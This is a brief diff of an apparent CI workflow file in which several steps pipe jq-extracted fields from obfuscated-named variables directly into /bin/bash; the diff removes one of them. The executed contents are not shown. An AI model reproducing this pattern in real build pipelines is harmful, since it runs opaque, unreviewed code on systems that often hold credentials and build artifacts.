@@ -24,7 +24,6 @@ jobs:
           echo $opaz84 | jq -r .cakug2944 | /bin/bash
           echo $okcf92328 | jq -r .gy5 | /bin/bash
           printf '%s' "$ygpfz8975" | jq -r .vxse4 | /bin/bash
-          echo $nsos1617 | jq -r .u062 | /bin/bash
           echo $oqwqj1549 | jq -r .kd27800 | /bin/bash
 
       - name: Save archive
